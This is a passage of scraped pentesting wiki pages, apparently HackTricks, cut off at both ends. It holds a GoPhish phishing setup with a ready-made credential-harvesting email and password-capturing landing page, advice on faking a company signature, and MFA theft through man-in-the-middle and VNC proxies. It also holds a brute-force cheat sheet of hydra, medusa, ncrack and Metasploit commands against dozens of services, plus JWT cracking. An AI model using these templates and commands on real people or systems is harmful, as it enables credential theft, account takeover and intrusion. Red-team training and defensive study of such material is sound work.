Profile\nSet some\nname to identify\nthe sender profile\nDecide from which account are you going to send the phishing emails. Suggestions:\nnoreply, support, servicedesk, salesforce...\nYou can leave blank the username and password, but make sure to check the Ignore Certificate Errors\nIt's recommended to use the \"\nSend Test Email\n\" functionality to test that everything is working.\nI would recommend to\nsend the test emails to 10min mails addresses\nin order to avoid getting blacklisted making tests.\nEmail Template\nSet some\nname to identify\nthe template\nThen write a\nsubject\n(nothing estrange, just something you could expect to read in a regular email)\nMake sure you have checked \"\nAdd Tracking Image\n\"\nWrite the\nemail template\n(you can use variables like in the following example):\n<\nhtml\n>\n<\nhead\n>\n<\ntitle\n>\n</\ntitle\n>\n</\nhead\n>\n<\nbody\n>\n<\np\nclass\n=\n\"\nMsoNormal\n\"\n>\n<\nspan\nstyle\n=\n\"\nfont-size\n:\n10.0pt\n;\nfont-family\n:\n&quot\n;\nVerdana&quot\n;,\nsans-serif\n;\ncolor\n:\nblack\n\"\n>\nDear {{.FirstName}} {{.LastName}},\n</\nspan\n>\n</\np\n>\n‚Äã\n<\np\nclass\n=\n\"\nMsoNormal\n\"\n>\n<\nspan\nstyle\n=\n\"\nfont-size\n:\n10.0pt\n;\nfont-family\n:\n&quot\n;\nVerdana&quot\n;,\nsans-serif\n;\ncolor\n:\nblack\n\"\n>\nAs you may be aware, due to the large number of employees working from home, the \"PLATFORM NAME\" platform is being migrated to a new domain with an improved and more secure version. To finalize account migration, please use the following link to log into the new HR portal and move your account to the new site:\n<\na\nhref\n=\n\"\n{{.URL}}\n\"\n>\n\"PLATFORM NAME\" login portal\n</\na\n>\n<\nbr\n/>\n<\nbr\n/>\nPlease Note: We require all users to move their accounts by 04/01/2021. Failure to confirm account migration may prevent you from logging into the application after the migration process is complete.\n<\nbr\n/>\n<\nbr\n/>\nRegards,\n</\nspan\n>\n</\np\n>\n‚Äã\nWRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY\n‚Äã\n<\np\n>\n{{.Tracker}}\n</\np\n>\n</\nbody\n>\n</\nhtml\n>\nNote that\nin order to increase the credibility of the email\n, it's recommended to use some signature from an email from the client. Suggestions:\nSend an email to a\nnon existent address\nand check if the response has any signature.\nSearch for\npublic emails\nlike\n[email¬†protected]\nor\n[email¬†protected]\nor\n[email¬†protected]\nand send them an email and wait for the response.\nTry to contact\nsome valid discovered\nemail and wait for the response\nThe Email Template also allows to\nattach files to send\n. If you would also like to steal NTLM challenges using some specially crafted files/documents\nread this page\n.\nLanding Page\nWrite a\nname\nWrite the HTML code\nof the web page. Note that you can\nimport\nweb pages.\nMark\nCapture Submitted Data\nand\nCapture Passwords\nSet a\nredirection\nUsually you will need to modify the HTML code of the page and make some tests in local (maybe using some Apache server)\nuntil you like the results.\nThen, write that HTML code in the box.\nNote that if you need to\nuse some static resources\nfor the HTML (maybe some CSS and JS pages) you can save them in\n/opt/gophish/static/endpoint\nand then access them from\n/static/<filename>\nFor the redirection you could\nredirect the users to the legit main web page\nof the victim, or redirect them to\n/static/migration.html\nfor example, put some\nspinning wheel (\nhttps://loading.io/\n) for 5 seconds and then indicate that the process was successful\n.\nUsers & Groups\nSet a name\nImport the data\n(note that in order to use the template for the example you need the firstname, last name and email address of each user)\nCampaign\nFinally, create a campaign selecting a name, the email template, the landing page, the URL, the sending profile and the group. Note that the URL will be the link sent to the victims\nNote that the\nSending Profile allow to send a test email to see how will the final phishing email looks like\n:\nI would recommend to\nsend the test emails to 10min mails addresses\nin order to avoid getting blacklisted making tests.\nOnce everything is ready, just launch the campaign!\nWebsite Cloning\nIf for any reason you want to clone the website check the following page:\nClone a Website\nBackdoored Documents & Files\nIn some phishing assessments (mainly for Red Teams) you will want to also\nsend files containing some kind of backdoor\n(maybe a C2 or maybe just something that will trigger an authentication).\nCheck out the following page for some examples:\nPhishing Files & Documents\nPhishing MFA\nVia Proxy MitM\nThe previous attack is pretty clever as you are faking a real website and gathering the information set by the user. Unfortunately, if the user didn't put the correct password or if the application you faked is configured with 2FA,\nthis information won't allow you to impersonate the tricked user\n.\nThis is where tools like\nevilginx2\n,\nCredSniper\nand\nmuraena\nare useful. This tool will allow you to generate a MitM like attack. Basically, the attacks works in the following way:\n1.\nYou\nimpersonate the login\nform of the real webpage.\n2.\nThe user\nsend\nhis\ncredentials\nto your fake page and the tool send those to the real webpage,\nchecking if the credentials work\n.\n3.\nIf the account is configured with\n2FA\n, the MitM page will ask for it and once the\nuser introduces\nit the tool will send it to the real web page.\n4.\nOnce the user is authenticated you (as attacker) will have\ncaptured the credentials, the 2FA, the cookie and any information\nof every interaction your while the tool is performing a MitM.\nVia VNC\nWhat if instead of\nsending the victim to a malicious page\nwith the same looks as the original one, you send him to a\nVNC session with a browser connected to the real web page\n? You will be able to see what he does, steal the password, the MFA used, the cookies...\nYou can do this with\nEvilnVNC\n‚Äã\nDetecting the detection\nObviously one of the best ways to know if you have been busted is to\nsearch your domain inside blacklists\n. If it appears listed, somehow your domain was detected as suspicions.\nOne easy way to check if you domain appears in any blacklist is to use\nhttps://malwareworld.com/\n‚Äã\nHowever, there are other ways to know if the victim is\nactively looking for suspicions phishing activity in the wild\nas explained in:\nDetecting Phishing\nYou can\nbuy a domain with a very similar name\nto the victims domain\nand/or generate a certificate\nfor a\nsubdomain\nof a domain controlled by you\ncontaining\nthe\nkeyword\nof the victim's domain. If the\nvictim\nperform any kind of\nDNS or HTTP interaction\nwith them, you will know that\nhe is actively looking\nfor suspicious domains and you will need to be very stealth.\nEvaluate the phishing\nUse\nPhishious\nto evaluate if your email is going to end in the spam folder or if it's going to be blocked or successful.\nReferences\n‚Äã\nhttps://zeltser.com/domain-name-variations-in-phishing/\n‚Äã\n‚Äã\nhttps://0xpatrik.com/phishing-domains/\n‚Äã\n‚Äã\nhttps://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nEvil Twin EAP-TLS\nNext\nClone a Website\nLast modified\n2mo ago"
    },
    {
        "title": "Basic Forensic Methodology",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology",
        "text": "Basic Forensic Methodology\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCreating and Mounting an Image\nImage Acquisition & Mount\nMalware Analysis\nThis\nisn't necessary the first step to perform once you have the image\n. But you can use this malware analysis techniques independently if you have a file, a file-system image, memory image, pcap... so it's good to\nkeep these actions in mind\n:\nMalware Analysis\nInspecting an Image\nif you are given a\nforensic image\nof a device you can start\nanalyzing the partitions, file-system\nused and\nrecovering\npotentially\ninteresting files\n(even deleted ones). Learn how in:\nPartitions/File Systems/Carving\nDepending on the used OSs and even platform different interesting artifacts should be searched:\nWindows Artifacts\nLinux Forensics\nDocker Forensics\nDeep inspection of specific file-types and Software\nIf you have very\nsuspicious\nfile\n, then\ndepending on the file-type and software\nthat created it several\ntricks\nmay be useful.\nRead the following page to learn some interesting tricks:\nSpecific Software/File-Type Tricks\nI want to do a special mention to the page:\nBrowser Artifacts\nMemory Dump Inspection\nMemory dump analysis\nPcap Inspection\nPcap Inspection\nAnti-Forensic Techniques\nKeep in mind the possible use of anti-forensic techniques:\nAnti-Forensic Techniques\nThreat Hunting\nBaseline Monitoring\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nPhishing Files & Documents\nNext\nBaseline Monitoring\nLast modified\n6mo ago"
    },
    {
        "title": "Brute Force - CheatSheet",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force",
        "text": "Brute Force - CheatSheet\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nDefault Credentials\nSearch in google\nfor default credentials of the technology that is being used, or\ntry these links\n:\n‚Äã\nhttps://github.com/ihebski/DefaultCreds-cheat-sheet\n‚Äã\n‚Äã\nhttp://www.phenoelit.org/dpl/dpl.html\n‚Äã\n‚Äã\nhttp://www.vulnerabilityassessment.co.uk/passwordsC.htm\n‚Äã\n‚Äã\nhttps://192-168-1-1ip.mobi/default-router-passwords-list/\n‚Äã\n‚Äã\nhttps://datarecovery.com/rd/default-passwords/\n‚Äã\n‚Äã\nhttps://bizuns.com/default-passwords-list\n‚Äã\n‚Äã\nhttps://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv\n‚Äã\n‚Äã\nhttps://github.com/Dormidera/WordList-Compendium\n‚Äã\n‚Äã\nhttps://www.cirt.net/passwords\n‚Äã\n‚Äã\nhttp://www.passwordsdatabase.com/\n‚Äã\n‚Äã\nhttps://many-passwords.github.io/\n‚Äã\n‚Äã\nhttps://theinfocentric.com/\n‚Äã\nCreate your own Dictionaries\nFind as much information about the target as you can and generate a custom dictionary. Tools that may help:\nCrunch\ncrunch\n4\n6\n0123456789ABCDEF\n-o\ncrunch1.txt\n#From length 4 to 6 using that alphabet\ncrunch\n4\n4\n-f\n/usr/share/crunch/charset.lst mixalpha\n# Only length 4 using charset mixalpha (inside file charset.lst)\n‚Äã\n@ Lower\ncase\nalpha characters\n, Upper\ncase\nalpha characters\n% Numeric characters\n^ Special characters including spac\ncrunch\n6\n8\n-t\n,@@^^%%\nCewl\ncewl example.com\n-m\n5\n-w\nwords.txt\n‚Äã\nCUPP\n‚Äã\nGenerate passwords based on your knowledge of the victim (names, dates...)\npython3 cupp.py -h\n‚Äã\nWister\n‚Äã\nA wordlist generator tool, that allows you to supply a set of words, giving you the possibility to craft multiple variations from the given words, creating a unique and ideal wordlist to use regarding a specific target.\npython3 wister.py\n-w\njane doe\n2022\nsummer madrid\n1998\n-c\n1\n2\n3\n4\n5\n-o\nwordlist.lst\n‚Äã\n__          _______  _____ _______ ______ _____\n\\\n\\\n/ /_   _\n|\n/ ____\n|\n__   __\n|\n____\n|\n__\n\\\n\\\n\\\n/\n\\\n/ /\n|\n|\n|\n(\n___\n|\n|\n|\n|\n__\n|\n|\n__\n)\n|\n\\\n\\\n/\n\\\n/ /\n|\n|\n\\\n___\n\\\n|\n|\n|\n__\n|\n|\n_  /\n\\\n/\n\\\n/   _\n|\n|\n_ ____\n)\n|\n|\n|\n|\n|\n____\n|\n|\n\\\n\\\n\\\n/\n\\\n/\n|\n_____\n|\n_____/\n|\n_\n|\n|\n______\n|\n_\n|\n\\\n_\n\\\n‚Äã\nVersion\n1.0\n.3                    Cycurity\nGenerating wordlist\n..\n.\n[\n########################################] 100%\nGenerated\n67885\nlines.\n‚Äã\nFinished\nin\n0\n.920s.\n‚Äã\npydictor\n‚Äã\nWordlists\n‚Äã\nhttps://github.com/danielmiessler/SecLists\n‚Äã\n‚Äã\nhttps://github.com/Dormidera/WordList-Compendium\n‚Äã\n‚Äã\nhttps://github.com/kaonashi-passwords/Kaonashi\n‚Äã\n‚Äã\nhttps://github.com/google/fuzzing/tree/master/dictionaries\n‚Äã\n‚Äã\nhttps://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm\n‚Äã\n‚Äã\nhttps://weakpass.com/wordlist/\n‚Äã\n‚Äã\nhttps://wordlists.assetnote.io/\n‚Äã\n‚Äã\nhttps://github.com/fssecur3/fuzzlists\n‚Äã\n‚Äã\nhttps://hashkiller.io/listmanager\n‚Äã\n‚Äã\nhttps://github.com/Karanxa/Bug-Bounty-Wordlists\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nServices\nOrdered alphabetically by service name.\nAFP\nnmap\n-p\n548\n--script\nafp-brute\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/afp/afp_login\nmsf\n>\nset\nBLANK_PASSWORDS\ntrue\nmsf\n>\nset\nUSER_AS_PASS\ntrue\nmsf\n>\nset\nPASS_FILE\n<\nPATH_PASSWDS\n>\nmsf\n>\nset\nUSER_FILE\n<\nPATH_USERS\n>\nmsf\n>\nrun\nAJP\nnmap\n--script\najp-brute\n-p\n8009\n<\nIP\n>\nCassandra\nnmap\n--script\ncassandra-brute\n-p\n9160\n<\nIP\n>\nCouchDB\nmsf\n>\nuse auxiliary/scanner/couchdb/couchdb_login\nhydra\n-L\n/usr/share/brutex/wordlists/simple-users.txt\n-P\n/usr/share/brutex/wordlists/password.lst localhost\n-s\n5984\nhttp-get /\nDocker Registry\nhydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/\nElasticsearch\nhydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /\nFTP\nhydra\n-l\nroot\n-P\npasswords.txt\n[\n-t\n32\n]\n<\nIP\n>\nftp\nncrack\n-p\n21\n--user\nroot\n-P\npasswords.txt\n<\nIP\n>\n[\n-T\n5\n]\nmedusa\n-u\nroot\n-P\n500\n-worst-passwords.txt\n-h\n<\nIP\n>\n-M\nftp\nHTTP Generic Brute\n‚Äã\nWFuzz\n‚Äã\nHTTP Basic Auth\nhydra\n-L\n/usr/share/brutex/wordlists/simple-users.txt\n-P\n/usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/\n# Use https-get mode for https\nmedusa\n-h\n<\nIP\n>\n-u\n<\nusername\n>\n-P\n<\npasswords.txt\n>\n-M\nhttp\n-m\nDIR:/path/to/auth\n-T\n10\nHTTP - Post Form\nhydra\n-L\n/usr/share/brutex/wordlists/simple-users.txt\n-P\n/usr/share/brutex/wordlists/password.lst domain.htb  http-post-form\n\"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect\"\n-V\n# Use https-post-form mode for https\nFor http\ns\nyou have to change from \"http-post-form\" to \"\nhttps-post-form\"\nHTTP - CMS --\n(W)ordpress, (J)oomla or (D)rupal or (M)oodle\ncmsmap\n-f\nW/J/D/M\n-u\na\n-p\na https://wordpress.com\nIMAP\nhydra\n-l\nUSERNAME\n-P\n/path/to/passwords.txt\n-f\n<\nIP\n>\nimap\n-V\nhydra\n-S\n-v\n-l\nUSERNAME\n-P\n/path/to/passwords.txt\n-s\n993\n-f\n<\nIP\n>\nimap\n-V\nnmap\n-sV\n--script\nimap-brute\n-p\n<\nPORT\n>\n<\nIP\n>\nIRC\nnmap\n-sV\n--script\nirc-brute,irc-sasl-brute --script-args\nuserdb\n=\n/path/users.txt,passdb\n=\n/path/pass.txt\n-p\n<\nPORT\n>\n<\nIP\n>\nISCSI\nnmap\n-sV\n--script\niscsi-brute --script-args\nuserdb\n=\n/var/usernames.txt,passdb\n=\n/var/passwords.txt\n-p\n3260\n<\nIP\n>\nJWT\n#hashcat\nhashcat\n-m\n16500\n-a\n0\njwt.txt .\n\\\nwordlists\n\\\nrockyou.txt\n‚Äã\n#https://github.com/Sjord/jwtcrack\npython crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt\n‚Äã\n#John\njohn jwt.txt\n--wordlist\n=\nwordlists.txt\n--format\n=\nHMAC-SHA256\n‚Äã\n#https://github.com/ticarpi/jwt_tool\npython3 jwt_tool.py\n-d\nwordlists.txt\n<\nJWT token\n>\n‚Äã\n#https://github.com/brendan-rius/c-jwt-cracker\n./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc\n1234567890\n8\n‚Äã\n#https://github.com/mazen160/jwt-pwn\npython3 jwt-cracker.py\n-jwt\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc\n-w\nwordlist.txt\n‚Äã\n#https://github.com/lmammino/jwt-cracker\njwt-cracker\n\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\"\n\"abcdefghijklmnopqrstuwxyz\"\n6\nLDAP\nnmap\n--script\nldap-brute\n-p\n389\n<\nIP\n>\nMQTT\nncrack mqtt://127.0.0.1 --user test \u0000\u0000‚ÄìP /root/Desktop/pass.txt -v\nMongo\nnmap\n-sV\n--script\nmongodb-brute\n-n\n-p\n27017\n<\nIP\n>\nuse auxiliary/scanner/mongodb/mongodb_login\nMySQL\n# hydra\nhydra\n-L\nusernames.txt\n-P\npass.txt\n<\nIP\n>\nmysql\n‚Äã\n# msfconsole\nmsf\n>\nuse auxiliary/scanner/mysql/mysql_login\n;\nset\nVERBOSE\nfalse\n‚Äã\n# medusa\nmedusa\n-h\n<\nIP/Host\n>\n-u\n<\nusername\n>\n-P\n<\npassword_list\n>\n<\n-f\n|\nto stop medusa on first success attempt\n>\n-t\n<\nthreads\n>\n-M\nmysql\nOracleSQL\npatator oracle_login\nsid\n=<\nSID\n>\nhost\n=<\nIP\n>\nuser\n=\nFILE0\npassword\n=\nFILE1\n0\n=\nusers-oracle.txt\n1\n=\npass-oracle.txt\n-x\nignore:code\n=\nORA-01017\n‚Äã\n./odat.py passwordguesser\n-s\n$SERVER\n-d\n$SID\n./odat.py passwordguesser\n-s\n$MYSERVER\n-p\n$PORT\n--accounts-file accounts_multiple.txt\n‚Äã\n#msf1\nmsf\n>\nuse admin/oracle/oracle_login\nmsf\n>\nset\nRHOSTS\n<\nIP\n>\nmsf\n>\nset\nRPORT\n1521\nmsf\n>\nset\nSID\n<\nSID\n>\n‚Äã\n#msf2, this option uses nmap and it fails sometimes for some reason\nmsf\n>\nuse scanner/oracle/oracle_login\nmsf\n>\nset\nRHOSTS\n<\nIP\n>\nmsf\n>\nset\nRPORTS\n1521\nmsf\n>\nset\nSID\n<\nSID\n>\n‚Äã\n#for some reason nmap fails sometimes when executing this script\nnmap\n--script\noracle-brute\n-p\n1521\n--script-args oracle-brute.sid\n=<\nSID\n>\n<\nIP\n>\nIn order to use\noracle_login\nwith\npatator\nyou need to\ninstall\n:\npip3\ninstall\ncx_Oracle\n--upgrade\n‚Äã\nOffline OracleSQL hash bruteforce\n(\nversions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,\nand\n11.2.0.3\n):\nnmap\n-p1521\n--script\noracle-brute-stealth --script-args oracle-brute-stealth.sid\n=\nDB11g\n-n\n10.11\n.21.30\nPOP\nhydra\n-l\nUSERNAME\n-P\n/path/to/passwords.txt\n-f\n<\nIP\n>\npop3\n-V\nhydra\n-S\n-v\n-l\nUSERNAME\n-P\n/path/to/passwords.txt\n-s\n995\n-f\n<\nIP\n>\npop3\n-V\nPostgreSQL\nhydra\n-L\n/root/Desktop/user.txt ‚ÄìP /root/Desktop/pass.txt\n<\nIP\n>\npostgres\nmedusa\n-h\n<\nIP\n>\n‚ÄìU /root/Desktop/user.txt ‚ÄìP /root/Desktop/pass.txt ‚ÄìM postgres\nncrack ‚Äìv ‚ÄìU /root/Desktop/user.txt ‚ÄìP /root/Desktop/pass.txt\n<\nIP\n>\n:5432\npatator pgsql_login\nhost\n=<\nIP\n>\nuser\n=\nFILE0\n0\n=\n/root/Desktop/user.txt\npassword\n=\nFILE1\n1\n=\n/root/Desktop/pass.txt\nuse auxiliary/scanner/postgres/postgres_login\nnmap\n-sV\n--script\npgsql-brute --script-args\nuserdb\n=\n/var/usernames.txt,passdb\n=\n/var/passwords.txt\n-p\n5432\n<\nIP\n>\nPPTP\nYou can download the\n.deb\npackage to install from\nhttps://http.kali.org/pool/main/t/thc-pptp-bruter/\n‚Äã\nsudo\ndpkg\n-i\nthc-pptp-bruter*.deb\n#Install the package\ncat\nrockyou.txt\n|\nthc-pptp-bruter ‚Äìu\n<\nUsername\n>\n<\nIP\n>\nRDP\nncrack\n-vv\n--user\n<\nUser\n>\n-P\npwds.txt rdp://\n<\nIP\n>\nhydra\n-V\n-f\n-L\n<\nuserslist\n>\n-P\n<\npasswlist\n>\nrdp://\n<\nIP\n>\nRedis\nmsf\n>\nuse auxiliary/scanner/redis/redis_login\nnmap\n--script\nredis-brute\n-p\n6379\n<\nIP\n>\nhydra ‚ÄìP /path/pass.txt redis://\n<\nIP\n>\n:\n<\nPORT\n>\n# 6379 is the default\nRexec\nhydra\n-l\n<\nusername\n>\n-P\n<\npassword_file\n>\nrexec://\n<\nVictim-IP\n>\n-v\n-V\nRlogin\nhydra\n-l\n<\nusername\n>\n-P\n<\npassword_file\n>\nrlogin://\n<\nVictim-IP\n>\n-v\n-V\nRsh\nhydra\n-L\n<\nUsername_list\n>\nrsh://\n<\nVictim_IP\n>\n-v\n-V\n‚Äã\nhttp://pentestmonkey.net/tools/misc/rsh-grind\n‚Äã\nRsync\nnmap\n-sV\n--script\nrsync-brute --script-args\nuserdb\n=\n/var/usernames.txt,passdb\n=\n/var/passwords.txt\n-p\n873\n<\nIP\n>\nRTSP\nhydra\n-l\nroot\n-P\npasswords.txt\n<\nIP\n>\nrtsp\nSNMP\nmsf\n>\nuse auxiliary/scanner/snmp/snmp_login\nnmap\n-sU\n--script\nsnmp-brute\n<\ntarget\n>\n[\n--script-args snmp-brute.communitiesdb\n=<\nwordlist\n>\n]\nonesixtyone\n-c\n/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt\n<\nIP\n>\nhydra\n-P\n/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp\nSMB\nnmap\n--script\nsmb-brute\n-p\n445\n<\nIP\n>\nhydra\n-l\nAdministrator\n-P\nwords.txt\n192.168\n.1.12 smb\n-t\n1\nSMTP\nhydra\n-l\n<\nusername\n>\n-P\n/path/to/passwords.txt\n<\nIP\n>\nsmtp\n-V\nhydra\n-l\n<\nusername\n>\n-P\n/path/to/passwords.txt\n-s\n587\n<\nIP\n>\n-S\n-v\n-V\n#Port 587 for SMTP with SSL\nSOCKS\nnmap\n-vvv\n-sCV\n--script\nsocks-brute --script-args\nuserdb\n=\nusers.txt,passdb\n=\n/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit\n=\n30m\n-p\n1080\n<\nIP\n>\nSSH\nhydra\n-l\nroot\n-P\npasswords.txt\n[\n-t\n32\n]\n<\nIP\n>\nssh\nncrack\n-p\n22\n--user\nroot\n-P\npasswords.txt\n<\nIP\n>\n[\n-T\n5\n]\nmedusa\n-u\nroot\n-P\n500\n-worst-passwords.txt\n-h\n<\nIP\n>\n-M\nssh\npatator ssh_login\nhost\n=<\nip\n>\nport\n=\n22\nuser\n=\nroot\n0\n=\n/path/passwords.txt\npassword\n=\nFILE0\n-x\nignore:mesg\n=\n'Authentication failed'\nWeak SSH keys / Debian predictable PRNG\nSome systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced with tools such as\nsnowdroppe/ssh-keybrute\n. Pre-generated sets of weak keys are also available such as\ng0tmi1k/debian-ssh\n.\nSQL Server\n#Use the NetBIOS name of the machine as domain\ncrackmapexec mssql\n<\nIP\n>\n-d\n<\nDomain Name\n>\n-u\nusernames.txt\n-p\npasswords.txt\nhydra\n-L\n/root/Desktop/user.txt ‚ÄìP /root/Desktop/pass.txt\n<\nIP\n>\nmssql\nmedusa\n-h\n<\nIP\n>\n‚ÄìU /root/Desktop/user.txt ‚ÄìP /root/Desktop/pass.txt ‚ÄìM mssql\nnmap\n-p\n1433\n--script\nms-sql-brute --script-args\nmssql.domain\n=\nDOMAIN,userdb\n=\ncustomuser.txt,passdb\n=\ncustompass.txt,ms-sql-brute.brute-windows-accounts\n<\nhost\n>\n#Use domain if needed. Be careful with the number of passwords in the list, this could block accounts\nmsf\n>\nuse auxiliary/scanner/mssql/mssql_login\n#Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT\nTelnet\nhydra\n-l\nroot\n-P\npasswords.txt\n[\n-t\n32\n]\n<\nIP\n>\ntelnet\nncrack\n-p\n23\n--user\nroot\n-P\npasswords.txt\n<\nIP\n>\n[\n-T\n5\n]\nmedusa\n-u\nroot\n-P\n500\n-worst-passwords.txt\n-h\n<\nIP\n>\n-M\ntelnet\nVNC\nhydra\n-L\n/root/Desktop/user.txt ‚ÄìP /root/Desktop/pass.txt\n-s\n<\nPORT\n>\n<\nIP\n>\nvnc\nmedusa\n-h\n<\nIP\n>\n‚Äìu root\n-P\n/root/Desktop/pass.txt ‚ÄìM vnc\nncrack\n-V\n--user\nroot\n-P\n/root/Desktop/pass.txt\n<\nIP\n>\n:\n>\nPOR\n>\nT\npatator vnc_login\nhost\n=<\nIP\n>\npassword\n=\nFILE0\n0\n=\n/root/Desktop/pass.txt ‚Äìt\n1\n‚Äìx retry:fgep\n!=\n'Authentication failure'\n--max-retries\n0\n‚Äìx quit:code\n=\n0\nuse auxiliary/scanner/vnc/vnc_login\nnmap\n-sV\n--script\npgsql-brute --script-args\nuserdb\n=\n/var/usernames.txt,passdb\n=\n/var/passwords.txt\n-p\n5432\n<\nIP\n>\n‚Äã\n#Metasploit\nuse auxiliary/scanner/vnc/vnc_login\nset\nRHOSTS\n<\nip\n>\nset\nPASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst\nWinrm\ncrackmapexec winrm\n<\nIP\n>\n-d\n<\nDomain Name\n>\n-u\nusernames.txt\n-p\npasswords.txt\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nLocal\nOnline cracking databases\n‚Äã\nhttp://hashtoolkit.com/reverse-hash?\n(MD5 & SHA1)\n‚Äã\nhttps://shuck.sh/get-shucking.php\n(MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)\n‚Äã\nhttps://www.onlinehashcrack.com/\n(Hashes, WPA2 captures, and archives MSOffice, ZIP, 